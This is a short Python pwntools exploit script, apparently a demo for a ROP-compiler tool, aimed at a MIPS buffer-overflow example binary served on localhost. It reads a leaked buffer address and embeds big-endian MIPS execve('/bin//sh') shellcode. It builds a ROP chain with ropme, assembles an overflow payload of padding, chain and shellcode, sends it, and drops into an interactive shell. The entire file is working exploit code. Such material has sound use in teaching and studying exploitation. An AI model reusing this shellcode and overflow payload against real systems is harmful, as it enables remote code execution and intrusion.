import sys, logging
import archinfo
from pwn import *
from rop_compiler import ropme

filename = './example/mips_bof'
p = remote('localhost', 8888)

buffer_address = struct.unpack(">I", p.read(4))[0]

shellcode = (
  "\x28\x06\xff\xff" +      # slti    a2,zero,-1
  "\x3c\x0f\x2f\x2f" +      # lui     t7,0x2f2f
  "\x35\xef\x62\x69" +      # ori     t7,t7,0x6269
  "\xaf\xaf\xff\xf4" +      # sw      t7,-12(sp)
  "\x3c\x0e\x6e\x2f" +      # lui     t6,0x6e2f
  "\x35\xce\x73\x68" +      # ori     t6,t6,0x7368
  "\xaf\xae\xff\xf8" +      # sw      t6,-8(sp)
  "\xaf\xa0\xff\xfc" +      # sw      zero,-4(sp)
  "\x27\xa4\xff\xf4" +      # addiu   a0,sp,-12
  "\x28\x05\xff\xff" +      # slti    a1,zero,-1
  "\x24\x02\x0f\xab" +      # li      v0,4011
  "\x01\x01\x01\x0c"        # syscall 0x40404
)
target_address = buffer_address + 700
print "shellcode ({} bytes) address: 0x{:x}".format(len(shellcode), target_address)

rop = ropme.rop_to_shellcode([(filename, None, 0)], [], target_address, archinfo.ArchMIPS32('Iend_BE'), logging.DEBUG)

payload = 'A'*512 + 'B'*4 + rop
payload += ((700 - len(payload)) * 'B') + shellcode
payload += "JEFF" # To end our input

with open("/tmp/rop", "w") as f: f.write(rop)
with open("/tmp/payload", "w") as f: f.write(payload)

p.writeline(payload)
p.interactive()
